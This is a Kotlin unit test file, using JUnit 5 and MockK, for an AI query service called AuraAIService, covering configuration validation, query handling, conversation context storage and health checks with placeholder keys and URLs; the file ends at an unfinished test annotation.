package dev.aurakai.auraframefx.ai.services

import io.mockk.*
import kotlinx.coroutines.test.runTest
import org.junit.jupiter.api.*
import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.Arguments
import org.junit.jupiter.params.provider.CsvSource
import org.junit.jupiter.params.provider.ValueSource
import org.junit.jupiter.params.provider.MethodSource
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.launch
import kotlinx.coroutines.supervisorScope
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.TimeoutCancellationException
import java.io.IOException
import java.net.SocketTimeoutException
import java.util.concurrent.TimeoutException
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.ConcurrentHashMap
import java.util.stream.Stream
import kotlin.time.Duration.Companion.milliseconds
import kotlin.time.Duration.Companion.seconds

@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class AuraAIServiceTest {

    private lateinit var auraAIService: AuraAIService
    private val mockHttpClient = mockk<HttpClient>()
    private val mockApiClient = mockk<ApiClient>()
    private val mockConfigService = mockk<ConfigService>()
    private val mockLogger = mockk<Logger>()

    @BeforeEach
    fun setUp() {
        clearAllMocks()
        auraAIService = AuraAIService(mockHttpClient, mockApiClient, mockConfigService, mockLogger)
    }

    @AfterEach
    fun tearDown() {
        unmockkAll()
    }

    @Nested
    @DisplayName("Initialization Tests")
    inner class InitializationTests {

        @Test
        @DisplayName("Should initialize service with valid configuration")
        fun `should initialize service with valid configuration`() {
            // Given
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig

            // When
            val result = auraAIService.initialize()

            // Then
            assertTrue(result)
            assertTrue(auraAIService.isInitialized())
            verify { mockConfigService.getConfig("ai") }
        }

        @Test
        @DisplayName("Should fail initialization with invalid configuration")
        fun `should fail initialization with invalid configuration`() {
            // Given
            val invalidConfig = mapOf<String, String>()
            every { mockConfigService.getConfig("ai") } returns invalidConfig

            // When
            val result = auraAIService.initialize()

            // Then
            assertFalse(result)
            assertFalse(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle null configuration gracefully")
        fun `should handle null configuration gracefully`() {
            // Given
            every { mockConfigService.getConfig("ai") } returns null

            // When
            val result = auraAIService.initialize()

            // Then
            assertFalse(result)
            assertFalse(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should validate required configuration fields")
        fun `should validate required configuration fields`() {
            // Given
            val incompleteConfigs = listOf(
                mapOf("apiKey" to "test-key"), // missing baseUrl and timeout
                mapOf("baseUrl" to "https://api.test.com"), // missing apiKey and timeout
                mapOf("timeout" to "30000"), // missing apiKey and baseUrl
                mapOf("apiKey" to "test-key", "baseUrl" to "https://api.test.com") // missing timeout
            )

            incompleteConfigs.forEach { config ->
                // Given
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Configuration $config should be invalid")
            }
        }

        @Test
        @DisplayName("Should handle concurrent initialization attempts")
        fun `should handle concurrent initialization attempts`() = runTest {
            // Given
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig

            // When
            val results = (1..5).map {
                auraAIService.initialize()
            }

            // Then
            assertTrue(results.all { it })
            assertTrue(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle initialization with extra configuration keys")
        fun `should handle initialization with extra configuration keys`() {
            // Given
            val configWithExtraKeys = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000",
                "extraKey1" to "value1",
                "extraKey2" to "value2",
                "unknownSetting" to "someValue"
            )
            every { mockConfigService.getConfig("ai") } returns configWithExtraKeys

            // When
            val result = auraAIService.initialize()

            // Then
            assertTrue(result)
            assertTrue(auraAIService.isInitialized())
        }

        @Test
        @DisplayName("Should handle initialization with configuration containing null values")
        fun `should handle initialization with configuration containing null values`() {
            // Given
            val configWithNulls = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000",
                "nullValue" to null
            ).filterValues { it != null }
            every { mockConfigService.getConfig("ai") } returns configWithNulls

            // When
            val result = auraAIService.initialize()

            // Then
            assertTrue(result)
        }

        @Test
        @DisplayName("Should handle initialization with configuration containing empty strings")
        fun `should handle initialization with configuration containing empty strings`() {
            // Given
            val configsWithEmptyStrings = listOf(
                mapOf("apiKey" to "", "baseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "")
            )

            configsWithEmptyStrings.forEach { config ->
                // Given
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Configuration with empty values should be invalid: $config")
            }
        }

        @Test
        @DisplayName("Should handle initialization with whitespace-only configuration values")
        fun `should handle initialization with whitespace-only configuration values`() {
            // Given
            val configsWithWhitespace = listOf(
                mapOf("apiKey" to "   ", "baseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "  \t\n  ", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "  30000  ")
            )

            configsWithWhitespace.forEach { config ->
                // Given
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                // Note: timeout with whitespace might be valid if it trims, but API key and baseUrl should not
                if (config["apiKey"]?.isBlank() == true || config["baseUrl"]?.isBlank() == true) {
                    assertFalse(result, "Configuration with whitespace-only critical values should be invalid: $config")
                }
            }
        }

        @Test
        @DisplayName("Should handle rapid successive initialization attempts")
        fun `should handle rapid successive initialization attempts`() = runTest {
            // Given
            val validConfig = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig

            // When
            val results = (1..100).map {
                async {
                    auraAIService.initialize()
                }
            }.map { it.await() }

            // Then
            assertTrue(results.all { it })
            assertTrue(auraAIService.isInitialized())
        }
    }

    @Nested
    @DisplayName("AI Query Tests")
    inner class AIQueryTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should successfully process valid query")
        fun `should successfully process valid query`() = runTest {
            // Given
            val query = "What is the meaning of life?"
            val expectedResponse = AIResponse(
                content = "The meaning of life is 42",
                confidence = 0.95,
                tokensUsed = 15
            )
            coEvery { mockApiClient.sendQuery(any()) } returns expectedResponse

            // When
            val result = auraAIService.processQuery(query)

            // Then
            assertEquals(expectedResponse, result)
            coVerify { mockApiClient.sendQuery(query) }
        }

        @ParameterizedTest
        @ValueSource(strings = ["", "   ", "\t\n"])
        @DisplayName("Should handle empty or whitespace queries")
        fun `should handle empty or whitespace queries`(query: String) = runTest {
            // When & Then
            assertThrows<IllegalArgumentException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should handle null query gracefully")
        fun `should handle null query gracefully`() = runTest {
            // When & Then
            assertThrows<IllegalArgumentException> {
                auraAIService.processQuery(null)
            }
        }

        @ParameterizedTest
        @CsvSource(
            "Simple query, 50",
            "Medium length query with more words, 100",
            "This is a very long query that contains many words and should test the token counting functionality properly, 200"
        )
        @DisplayName("Should handle queries of different lengths")
        fun `should handle queries of different lengths`(query: String, expectedTokens: Int) = runTest {
            // Given
            val response = AIResponse(
                content = "Test response",
                confidence = 0.8,
                tokensUsed = expectedTokens
            )
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            val result = auraAIService.processQuery(query)

            // Then
            assertEquals(expectedTokens, result.tokensUsed)
        }

        @Test
        @DisplayName("Should handle network timeout gracefully")
        fun `should handle network timeout gracefully`() = runTest {
            // Given
            val query = "Test query"
            coEvery { mockApiClient.sendQuery(any()) } throws SocketTimeoutException("Request timeout")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should handle API rate limiting")
        fun `should handle API rate limiting`() = runTest {
            // Given
            val query = "Test query"
            coEvery { mockApiClient.sendQuery(any()) } throws ApiRateLimitException("Rate limit exceeded")

            // When & Then
            assertThrows<ServiceException> {
                auraAIService.processQuery(query)
            }
        }

        @Test
        @DisplayName("Should retry on transient failures")
        fun `should retry on transient failures`() = runTest {
            // Given
            val query = "Test query"
            val expectedResponse = AIResponse("Success", 0.9, 10)
            coEvery { mockApiClient.sendQuery(any()) } throws IOException("Network error") andThen expectedResponse

            // When
            val result = auraAIService.processQuery(query)

            // Then
            assertEquals(expectedResponse, result)
            coVerify(exactly = 2) { mockApiClient.sendQuery(query) }
        }

        @Test
        @DisplayName("Should handle query with special characters and encoding")
        fun `should handle query with special characters and encoding`() = runTest {
            // Given
            val specialQueries = listOf(
                "Query with émojis 🚀🤖",
                "Query with Chinese characters: 你好世界",
                "Query with Arabic: مرحبا بالعالم",
                "Query with Hebrew: שלום עולם",
                "Query with Russian: Привет мир",
                "Query with mathematical symbols: ∑∫∂∞",
                "Query with currency symbols: $€£¥₹"
            )
            val response = AIResponse("Special char response", 0.8, 10)

            specialQueries.forEach { query ->
                // Given
                coEvery { mockApiClient.sendQuery(query) } returns response

                // When
                val result = auraAIService.processQuery(query)

                // Then
                assertEquals(response, result)
                coVerify { mockApiClient.sendQuery(query) }
            }
        }

        @Test
        @DisplayName("Should handle extremely long queries")
        fun `should handle extremely long queries`() = runTest {
            // Given
            val longQuery = "word ".repeat(10000).trim()
            val response = AIResponse("Long query response", 0.8, 5000)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            val result = auraAIService.processQuery(longQuery)

            // Then
            assertEquals(response, result)
        }

        @Test
        @DisplayName("Should handle service not initialized error during query")
        fun `should handle service not initialized error during query`() = runTest {
            // Given
            auraAIService.shutdown() // Ensure service is not initialized

            // When & Then
            assertThrows<IllegalStateException> {
                auraAIService.processQuery("Test query")
            }
        }

        @Test
        @DisplayName("Should handle queries with control characters")
        fun `should handle queries with control characters`() = runTest {
            // Given
            val controlCharQueries = listOf(
                "Query with\u0000null byte",
                "Query with\u0001control char",
                "Query with\u007Fdelete char",
                "Query with\u0008backspace",
                "Query with\u001Bescape"
            )
            val response = AIResponse("Control char response", 0.8, 10)

            controlCharQueries.forEach { query ->
                // Given
                coEvery { mockApiClient.sendQuery(query) } returns response

                // When
                val result = auraAIService.processQuery(query)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle queries with maximum length boundaries")
        fun `should handle queries with maximum length boundaries`() = runTest {
            // Given
            val boundaryLengths = listOf(1, 100, 1000, 10000, 100000)
            val response = AIResponse("Boundary response", 0.8, 50)

            boundaryLengths.forEach { length ->
                // Given
                val query = "a".repeat(length)
                coEvery { mockApiClient.sendQuery(query) } returns response

                // When
                val result = auraAIService.processQuery(query)

                // Then
                assertEquals(response, result)
            }
        }

        @Test
        @DisplayName("Should handle concurrent queries from multiple threads")
        fun `should handle concurrent queries from multiple threads`() = runTest {
            // Given
            val numberOfQueries = 50
            val queries = (1..numberOfQueries).map { "Concurrent query $it" }
            val responses = queries.map { AIResponse("Response for $it", 0.8, 10) }
            
            queries.zip(responses).forEach { (query, response) ->
                coEvery { mockApiClient.sendQuery(query) } returns response
            }

            // When
            val results = queries.map { query ->
                async {
                    auraAIService.processQuery(query)
                }
            }.map { it.await() }

            // Then
            assertEquals(numberOfQueries, results.size)
            results.zip(responses).forEach { (result, expected) ->
                assertEquals(expected, result)
            }
        }

        @Test
        @DisplayName("Should handle queries with varying response times")
        fun `should handle queries with varying response times`() = runTest {
            // Given
            val queries = listOf("Fast query", "Slow query", "Medium query")
            val responses = listOf(
                AIResponse("Fast response", 0.9, 5),
                AIResponse("Slow response", 0.7, 100),
                AIResponse("Medium response", 0.8, 25)
            )
            val delays = listOf(10, 500, 100)

            queries.zip(responses).zip(delays).forEach { (queryResponse, delay) ->
                val (query, response) = queryResponse
                coEvery { mockApiClient.sendQuery(query) } coAnswers {
                    delay(delay.toLong())
                    response
                }
            }

            // When
            val results = queries.map { query ->
                async {
                    auraAIService.processQuery(query)
                }
            }.map { it.await() }

            // Then
            assertEquals(3, results.size)
            results.zip(responses).forEach { (result, expected) ->
                assertEquals(expected, result)
            }
        }

        @Test
        @DisplayName("Should handle query cancellation gracefully")
        fun `should handle query cancellation gracefully`() = runTest {
            // Given
            val query = "Cancellable query"
            coEvery { mockApiClient.sendQuery(any()) } coAnswers {
                delay(1000) // Long delay to allow cancellation
                AIResponse("Should not reach here", 0.8, 10)
            }

            // When & Then
            assertThrows<TimeoutCancellationException> {
                withTimeout(100) {
                    auraAIService.processQuery(query)
                }
            }
        }

        @Test
        @DisplayName("Should handle query with binary data")
        fun `should handle query with binary data`() = runTest {
            // Given
            val binaryQuery = "Query with binary data: ${byteArrayOf(0x00, 0x01, 0x02, 0xFF.toByte()).decodeToString()}"
            val response = AIResponse("Binary response", 0.8, 15)
            coEvery { mockApiClient.sendQuery(any()) } returns response

            // When
            val result = auraAIService.processQuery(binaryQuery)

            // Then
            assertEquals(response, result)
        }

        @Test
        @DisplayName("Should handle queries with malformed Unicode")
        fun `should handle queries with malformed Unicode`() = runTest {
            // Given
            val malformedQueries = listOf(
                "Query with surrogate \uD800",
                "Query with invalid \uDFFF",
                "Query with BOM \uFEFF",
                "Query with replacement \uFFFD"
            )
            val response = AIResponse("Malformed unicode response", 0.8, 10)

            malformedQueries.forEach { query ->
                // Given
                coEvery { mockApiClient.sendQuery(query) } returns response

                // When
                val result = auraAIService.processQuery(query)

                // Then
                assertEquals(response, result)
            }
        }
    }

    @Nested
    @DisplayName("Context Management Tests")
    inner class ContextManagementTests {

        @BeforeEach
        fun setUpInitializedService() {
            val validConfig = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns validConfig
            auraAIService.initialize()
        }

        @Test
        @DisplayName("Should maintain conversation context")
        fun `should maintain conversation context`() = runTest {
            // Given
            val sessionId = "test-session-123"
            val firstQuery = "Hello"
            val secondQuery = "What did I just say?"
            
            val firstResponse = AIResponse("Hello there!", 0.9, 5)
            val secondResponse = AIResponse("You said 'Hello'", 0.95, 8)
            
            coEvery { mockApiClient.sendQueryWithContext(firstQuery, emptyList()) } returns firstResponse
            coEvery { mockApiClient.sendQueryWithContext(secondQuery, any()) } returns secondResponse

            // When
            val result1 = auraAIService.processQueryWithContext(firstQuery, sessionId)
            val result2 = auraAIService.processQueryWithContext(secondQuery, sessionId)

            // Then
            assertEquals(firstResponse, result1)
            assertEquals(secondResponse, result2)
            coVerify { mockApiClient.sendQueryWithContext(secondQuery, match { it.isNotEmpty() }) }
        }

        @Test
        @DisplayName("Should clear context when requested")
        fun `should clear context when requested`() {
            // Given
            val sessionId = "test-session-123"
            auraAIService.storeContext(sessionId, "Previous context")

            // When
            auraAIService.clearContext(sessionId)

            // Then
            assertTrue(auraAIService.getContext(sessionId).isEmpty())
        }

        @Test
        @DisplayName("Should handle multiple concurrent sessions")
        fun `should handle multiple concurrent sessions`() = runTest {
            // Given
            val session1 = "session-1"
            val session2 = "session-2"
            val query = "Test query"
            
            val response1 = AIResponse("Response 1", 0.8, 10)
            val response2 = AIResponse("Response 2", 0.9, 12)
            
            coEvery { mockApiClient.sendQueryWithContext(query, emptyList()) } returns response1 andThen response2

            // When
            val result1 = auraAIService.processQueryWithContext(query, session1)
            val result2 = auraAIService.processQueryWithContext(query, session2)

            // Then
            assertEquals(response1, result1)
            assertEquals(response2, result2)
            assertNotEquals(auraAIService.getContext(session1), auraAIService.getContext(session2))
        }

        @Test
        @DisplayName("Should handle context overflow and truncation")
        fun `should handle context overflow and truncation`() = runTest {
            // Given
            val sessionId = "overflow-session"
            val maxContextSize = 1000
            val largeContextItems = (1..1500).map { "Context item $it" }

            // When
            largeContextItems.forEach { item ->
                auraAIService.storeContext(sessionId, item)
            }
            val retrievedContext = auraAIService.getContext(sessionId)

            // Then
            assertTrue(retrievedContext.size <= maxContextSize)
            // Should keep most recent items
            assertTrue(retrievedContext.any { it.contains("1500") })
        }

        @Test
        @DisplayName("Should handle invalid session IDs")
        fun `should handle invalid session IDs`() {
            // Given
            val invalidSessionIds = listOf(
                "", "   ", "\t\n", "session\nwith\nnewlines",
                "session\rwith\rreturns", "session\u0000with\u0000nulls"
            )

            invalidSessionIds.forEach { sessionId ->
                // When & Then
                assertThrows<IllegalArgumentException> {
                    auraAIService.storeContext(sessionId, "Test context")
                }
            }
        }

        @Test
        @DisplayName("Should preserve context order across operations")
        fun `should preserve context order across operations`() = runTest {
            // Given
            val sessionId = "order-session"
            val contexts = listOf("First", "Second", "Third", "Fourth", "Fifth")

            // When
            contexts.forEach { context ->
                auraAIService.storeContext(sessionId, context)
            }
            val retrievedContexts = auraAIService.getContext(sessionId)

            // Then
            assertEquals(contexts, retrievedContexts)
        }

        @Test
        @DisplayName("Should handle context storage with empty or null values")
        fun `should handle context storage with empty or null values`() {
            // Given
            val sessionId = "empty-context-session"
            val invalidContexts = listOf("", "   ", "\t\n", null)

            invalidContexts.forEach { context ->
                // When & Then
                assertThrows<IllegalArgumentException> {
                    auraAIService.storeContext(sessionId, context)
                }
            }
        }

        @Test
        @DisplayName("Should handle context retrieval for non-existent sessions")
        fun `should handle context retrieval for non-existent sessions`() {
            // Given
            val nonExistentSessionId = "non-existent-session"

            // When
            val context = auraAIService.getContext(nonExistentSessionId)

            // Then
            assertTrue(context.isEmpty())
        }

        @Test
        @DisplayName("Should handle context storage with special characters")
        fun `should handle context storage with special characters`() {
            // Given
            val sessionId = "special-char-session"
            val specialContexts = listOf(
                "Context with émojis 🚀🤖",
                "Context with newlines\nand\ttabs",
                "Context with quotes \"and\" 'apostrophes'",
                "Context with symbols @#$%^&*()",
                "Context with Unicode: ∑∫∂∞"
            )

            specialContexts.forEach { context ->
                // When
                auraAIService.storeContext(sessionId, context)
            }
            val retrievedContexts = auraAIService.getContext(sessionId)

            // Then
            assertEquals(specialContexts, retrievedContexts)
        }

        @Test
        @DisplayName("Should handle concurrent context operations")
        fun `should handle concurrent context operations`() = runTest {
            // Given
            val sessionId = "concurrent-session"
            val numberOfOperations = 100
            val counter = AtomicInteger(0)

            // When
            val operations = (1..numberOfOperations).map { i ->
                async {
                    val context = "Context ${counter.incrementAndGet()}"
                    auraAIService.storeContext(sessionId, context)
                }
            }
            operations.forEach { it.await() }

            val retrievedContexts = auraAIService.getContext(sessionId)

            // Then
            assertEquals(numberOfOperations, retrievedContexts.size)
            assertTrue(retrievedContexts.all { it.startsWith("Context ") })
        }

        @Test
        @DisplayName("Should handle context storage with very long strings")
        fun `should handle context storage with very long strings`() {
            // Given
            val sessionId = "long-context-session"
            val longContext = "Very long context ".repeat(1000)

            // When
            auraAIService.storeContext(sessionId, longContext)
            val retrievedContext = auraAIService.getContext(sessionId)

            // Then
            assertEquals(1, retrievedContext.size)
            assertEquals(longContext, retrievedContext.first())
        }

        @Test
        @DisplayName("Should handle context clearing for non-existent sessions")
        fun `should handle context clearing for non-existent sessions`() {
            // Given
            val nonExistentSessionId = "non-existent-session"

            // When & Then - Should not throw exception
            assertDoesNotThrow {
                auraAIService.clearContext(nonExistentSessionId)
            }
        }

        @Test
        @DisplayName("Should handle context operations with boundary session IDs")
        fun `should handle context operations with boundary session IDs`() {
            // Given
            val boundarySessionIds = listOf(
                "a", // Single character
                "a".repeat(100), // Long session ID
                "session-with-many-hyphens-and-numbers-123-456-789",
                "session_with_underscores_123",
                "sessionWITHmixedCASE123"
            )

            boundarySessionIds.forEach { sessionId ->
                // When
                auraAIService.storeContext(sessionId, "Test context for $sessionId")
                val retrievedContext = auraAIService.getContext(sessionId)

                // Then
                assertEquals(1, retrievedContext.size)
                assertEquals("Test context for $sessionId", retrievedContext.first())
            }
        }

        @Test
        @DisplayName("Should handle massive context storage and retrieval")
        fun `should handle massive context storage and retrieval`() = runTest {
            // Given
            val sessionId = "massive-context-session"
            val numberOfSessions = 50
            val contextPerSession = 20

            // When
            (1..numberOfSessions).forEach { sessionNum ->
                val currentSessionId = "$sessionId-$sessionNum"
                (1..contextPerSession).forEach { contextNum ->
                    auraAIService.storeContext(currentSessionId, "Context $contextNum for session $sessionNum")
                }
            }

            // Then
            (1..numberOfSessions).forEach { sessionNum ->
                val currentSessionId = "$sessionId-$sessionNum"
                val retrievedContext = auraAIService.getContext(currentSessionId)
                assertTrue(retrievedContext.size <= contextPerSession)
            }
        }
    }

    @Nested
    @DisplayName("Configuration Management Tests")
    inner class ConfigurationManagementTests {

        @Test
        @DisplayName("Should update configuration at runtime")
        fun `should update configuration at runtime`() {
            // Given
            val newConfig = mapOf(
                "apiKey" to "new-test-key",
                "baseUrl" to "https://new-api.test.com",
                "timeout" to "45000"
            )
            every { mockConfigService.updateConfig("ai", newConfig) } returns true

            // When
            val result = auraAIService.updateConfiguration(newConfig)

            // Then
            assertTrue(result)
            verify { mockConfigService.updateConfig("ai", newConfig) }
        }

        @Test
        @DisplayName("Should validate configuration before updating")
        fun `should validate configuration before updating`() {
            // Given
            val invalidConfig = mapOf("invalidKey" to "invalidValue")

            // When
            val result = auraAIService.updateConfiguration(invalidConfig)

            // Then
            assertFalse(result)
            verify(exactly = 0) { mockConfigService.updateConfig(any(), any()) }
        }

        @Test
        @DisplayName("Should get current configuration")
        fun `should get current configuration`() {
            // Given
            val expectedConfig = mapOf(
                "apiKey" to "current-key",
                "baseUrl" to "https://current-api.test.com",
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns expectedConfig

            // When
            val result = auraAIService.getCurrentConfiguration()

            // Then
            assertEquals(expectedConfig, result)
        }

        @ParameterizedTest
        @CsvSource(
            "0, false",
            "-1, false",
            "1, true",
            "30000, true",
            "60000, true",
            "120000, false"
        )
        @DisplayName("Should validate timeout values correctly")
        fun `should validate timeout values correctly`(timeout: String, expectedValid: Boolean) {
            // Given
            val config = mapOf(
                "apiKey" to "test-key",
                "baseUrl" to "https://api.test.com",
                "timeout" to timeout
            )
            every { mockConfigService.getConfig("ai") } returns config

            // When
            val result = auraAIService.initialize()

            // Then
            assertEquals(expectedValid, result)
        }

        @ParameterizedTest
        @ValueSource(strings = ["", "   ", "invalid-url", "ftp://invalid", "http://", "https://"])
        @DisplayName("Should validate base URL format")
        fun `should validate base URL format`(baseUrl: String) {
            // Given
            val config = mapOf(
                "apiKey" to "test-key-12345",
                "baseUrl" to baseUrl,
                "timeout" to "30000"
            )
            every { mockConfigService.getConfig("ai") } returns config

            // When
            val result = auraAIService.initialize()

            // Then
            if (baseUrl.matches(Regex("^https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*"))) {
                assertTrue(result)
            } else {
                assertFalse(result)
            }
        }

        @Test
        @DisplayName("Should handle configuration rollback on failure")
        fun `should handle configuration rollback on failure`() {
            // Given
            val originalConfig = mapOf(
                "apiKey" to "original-key",
                "baseUrl" to "https://original.test.com",
                "timeout" to "30000"
            )
            val failingConfig = mapOf(
                "apiKey" to "failing-key",
                "baseUrl" to "invalid-url",
                "timeout" to "30000"
            )
            
            every { mockConfigService.getConfig("ai") } returns originalConfig
            every { mockConfigService.updateConfig("ai", failingConfig) } returns false
            auraAIService.initialize()

            // When
            val updateResult = auraAIService.updateConfiguration(failingConfig)
            val currentConfig = auraAIService.getCurrentConfiguration()

            // Then
            assertFalse(updateResult)
            assertEquals(originalConfig, currentConfig)
        }

        @Test
        @DisplayName("Should handle configuration update with partial valid data")
        fun `should handle configuration update with partial valid data`() {
            // Given
            val partialConfigs = listOf(
                mapOf("apiKey" to "new-key-12345"),
                mapOf("baseUrl" to "https://new-api.test.com"),
                mapOf("timeout" to "45000"),
                mapOf("apiKey" to "new-key-12345", "baseUrl" to "https://new-api.test.com")
            )

            partialConfigs.forEach { config ->
                // When
                val result = auraAIService.updateConfiguration(config)

                // Then
                assertFalse(result, "Partial configuration should be rejected: $config")
            }
        }

        @Test
        @DisplayName("Should handle configuration update with invalid data types")
        fun `should handle configuration update with invalid data types`() {
            // Given
            val invalidConfigs = listOf(
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "invalid"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "-1"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "999999999")
            )

            invalidConfigs.forEach { config ->
                // Given
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                assertFalse(result, "Invalid configuration should be rejected: $config")
            }
        }

        @Test
        @DisplayName("Should handle configuration with special characters in values")
        fun `should handle configuration with special characters in values`() {
            // Given
            val configsWithSpecialChars = listOf(
                mapOf("apiKey" to "key-with-special-chars-@#$%", "baseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "key_with_underscores", "baseUrl" to "https://api-with-hyphens.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "keyWithMixedCase123", "baseUrl" to "https://api.test.com:8080", "timeout" to "30000")
            )

            configsWithSpecialChars.forEach { config ->
                // Given
                every { mockConfigService.getConfig("ai") } returns config

                // When
                val result = auraAIService.initialize()

                // Then
                if (config["apiKey"]?.length ?: 0 >= 8) {
                    assertTrue(result, "Valid configuration with special chars should be accepted: $config")
                } else {
                    assertFalse(result, "Invalid configuration should be rejected: $config")
                }
            }
        }

        @Test
        @DisplayName("Should handle concurrent configuration updates")
        fun `should handle concurrent configuration updates`() = runTest {
            // Given
            val configs = (1..10).map { i ->
                mapOf(
                    "apiKey" to "test-key-$i",
                    "baseUrl" to "https://api$i.test.com",
                    "timeout" to "30000"
                )
            }
            
            configs.forEach { config ->
                every { mockConfigService.updateConfig("ai", config) } returns true
            }

            // When
            val results = configs.map { config ->
                async {
                    auraAIService.updateConfiguration(config)
                }
            }.map { it.await() }

            // Then
            assertTrue(results.all { it })
        }

        @Test
        @DisplayName("Should handle configuration update with case sensitivity")
        fun `should handle configuration update with case sensitivity`() {
            // Given
            val caseSensitiveConfigs = listOf(
                mapOf("ApiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apikey" to "test-key-12345", "baseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "BaseUrl" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseURL" to "https://api.test.com", "timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "Timeout" to "30000"),
                mapOf("apiKey" to "test-key-12345", "baseUrl" to "https://api.test.com", "TIMEOUT" to "30000")
            )

            caseSensitiveConfigs.forEach { config ->
                // When
                val result = auraAIService.updateConfiguration(config)

                // Then
                assertFalse(result, "Case-sensitive configuration keys should be rejected: $config")
            }
        }

        @Test
        @DisplayName("Should handle configuration persistence across service restarts")
        fun `should handle configuration persistence across service restarts`() {
            // Given
            val originalConfig = mapOf(
                "apiKey" to "original-key-12345",
                "baseUrl" to "https://original.test.com",
                "timeout" to "30000"
            )
            val updatedConfig = mapOf(
                "apiKey" to "updated-key-12345",
                "baseUrl" to "https://updated.test.com",
                "timeout" to "45000"
            )
            
            every { mockConfigService.getConfig("ai") } returns originalConfig
            every { mockConfigService.updateConfig("ai", updatedConfig) } returns true
            
            // When
            auraAIService.initialize()
            val updateResult = auraAIService.updateConfiguration(updatedConfig)
            
            // Update mock to return new config
            every { mockConfigService.getConfig("ai") } returns updatedConfig
            
            auraAIService.shutdown()
            val reinitializeResult = auraAIService.initialize()
            val currentConfig = auraAIService.getCurrentConfiguration()

            // Then
            assertTrue(updateResult)
            assertTrue(reinitializeResult)
            assertEquals(updatedConfig, currentConfig)
        }
    }

    @Nested
    @DisplayName("Service State Management Tests")
    inner class ServiceStateManagementTests {

        @Test
        @DisplayName("Should report correct service status")
        fun `should report correct service status`() {
            // Given
            val config = mapOf("apiKey" to "test", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config
            
            // When
            auraAIService.initialize()
            val status = auraAIService.getServiceStatus()

            // Then
            assertTrue(status.isHealthy)
            assertTrue(status.isInitialized)
            assertNotNull(status.lastHealthCheck)
        }

        @Test
        @DisplayName("Should perform health checks")
        fun `should perform health checks`() = runTest {
            // Given
            coEvery { mockApiClient.healthCheck() } returns true

            // When
            val result = auraAIService.performHealthCheck()

            // Then
            assertTrue(result)
            coVerify { mockApiClient.healthCheck() }
        }

        @Test
        @DisplayName("Should handle failed health checks")
        fun `should handle failed health checks`() = runTest {
            // Given
            coEvery { mockApiClient.healthCheck() } throws IOException("Service unavailable")

            // When
            val result = auraAIService.performHealthCheck()

            // Then
            assertFalse(result)
        }

        @Test
        @DisplayName("Should shutdown gracefully")
        fun `should shutdown gracefully`() = runTest {
            // Given
            val config = mapOf("apiKey" to "test", "baseUrl" to "https://test.com", "timeout" to "30000")
            every { mockConfigService.getConfig("ai") } returns config
            auraAIService.initialize()

            // When
            auraAIService.shutdown()

            // Then
            assertFalse(auraAIService.isInitialized())
            verify { mockLogger.info("AuraAI service shutting down") }
        }

        @Test
